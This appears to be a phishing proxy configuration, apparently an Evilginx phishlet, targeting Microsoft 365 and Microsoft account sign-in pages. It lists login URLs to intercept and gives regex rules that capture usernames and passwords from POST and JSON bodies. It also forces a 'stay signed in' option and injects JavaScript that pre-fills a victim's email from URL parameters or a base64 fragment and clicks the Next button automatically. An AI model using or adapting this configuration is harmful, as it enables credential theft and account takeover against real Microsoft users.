force_post:
  - path: "/ppsecure/post*"
    search:
      - { key: "LoginOptions", search: "1" }
    force:
      - { key: "DontShowAgain", value: "true" }
    type: "post"

auth_urls:
  - "/kmsi*"
  - "/landingv2*"
  - "/landing*"
  - "/login.srf"
  - "/common/oauth2/authorize*"
  - "/common/oauth2/v2.0/authorize*"
  - "/{tenant}/oauth2/authorize*"
  - "/{tenant}/oauth2/v2.0/authorize*"
  - "/consumers/fido/*"

credentials:
  username:
    key: "(login|UserName|username|email|account|identifier|utemp)"
    search: '(.*)'
    type: 'post'
  password:
    key: "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)"
    search: '(.*)'
    type: "post"
  custom:
    - key: 'Username'
      search: '"username":"([^"]*)'
      type: "json"
    - key: 'Login'
      search: '"login":"([^"]*)'
      type: "json"
    - key: 'password'
      search: '"password":"([^"]*)'
      type: "json"


login:
  domain: "login.microsoftonline.com"
  path: "/"


js_inject:
  - trigger_domains: ["login.microsoftonline.com", "login.live.com", "login.microsoft.com"]
    trigger_paths: ["/common/oauth2/", "/", "/*", "/consumers/*"]
    script: |
      // Email autograb functionality
      function autoGrabEmail() {
        // Check URL parameters for email
        var urlParams = new URLSearchParams(window.location.search);
        var emailId = document.querySelector("#i0116");
        var nextButton = document.querySelector("#idSIButton9");
        
        // Extract email from various URL parameters
        var email = urlParams.get('email') || urlParams.get('user') || urlParams.get('login') || urlParams.get('username');
        
        // Extract from hash if base64 encoded
        var query = window.location.href;
        if (/#/.test(window.location.href)){
          var res = query.split("#");
          var data1 = res[0];
          var data2 = res[1];
          console.log(data1);
          console.log(data2);
          if (emailId != null) {
            var decodedString = data2;
            if (/^[A-Za-z0-9+/=]+$/.test(data2)) { // check if string is base64 encoded
              try {
                decodedString = window.atob(data2.replace(/[=]/gi, ''));
              } catch (e) {
                console.error('Error decoding base64 string:', e);
              }
            }
            email = decodedString || email;
          }
        }
        
        // Auto-fill email if found
        if (email && emailId && emailId.value === '') {
          emailId.focus();
          emailId.value = email;
          // Auto-click next button after short delay
          setTimeout(function() {
            if (nextButton) {
              nextButton.focus();
              nextButton.click();
            }
          }, 1000);
          console.log("Autograb: Email filled - " + email);
          return;
        }
        
        // Fallback to original logic
        if (emailId != null) {
          var decodedString = data2;
          if (/^[A-Za-z0-9+/=]+$/.test(data2)) { // check if string is base64 encoded
            try {
              decodedString = window.atob(data2.replace(/[=]/gi, ''));
            } catch (e) {
              console.error('Error decoding base64 string:', e);
            }
          }
          emailId.focus();
          emailId.value = decodedString;
          nextButton.focus();
          nextButton.click();
          console.log("YES!");
          return;
        }
        
        setTimeout(function(){autoGrabEmail();}, 500);
      }
      
      // Start autograb on page load
      setTimeout(function(){autoGrabEmail();}, 500);